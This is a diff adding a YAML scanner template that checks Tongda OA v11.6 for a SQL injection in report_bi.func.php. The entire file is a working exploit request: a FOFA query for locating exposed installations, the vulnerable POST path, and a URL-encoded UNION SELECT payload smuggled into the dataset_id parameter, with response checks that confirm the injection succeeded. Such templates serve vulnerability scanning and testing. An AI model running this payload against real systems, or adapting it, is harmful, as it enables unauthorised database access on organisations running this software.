@@ -1,0 +1,29 @@
+info:
+  vulId: tongda_sqli_get_datas
+  detail: 通达OA v11.6 report_bi.func.php SQL注入漏洞
+  fofaQuery: app="TDXK-通达OA"
+rules:
+  - request:
+      payload:
+        - union+select+database%28%29%2C2%2CMD5(123456)%23%27
+      path: "{{rootUrl}}/general/bi_design/appcenter/report_bi.func.php"
+      method: POST
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+        Content-type: application/x-www-form-urlencoded
+      redirect: false
+      dataType: text
+      data: "_POST[dataset_id]=efgh%27-%40%60%27%60%29{{payload}}&action=get_link_info&"
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - col
+          - e10adc3949ba59abbe56e057f20f883e
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
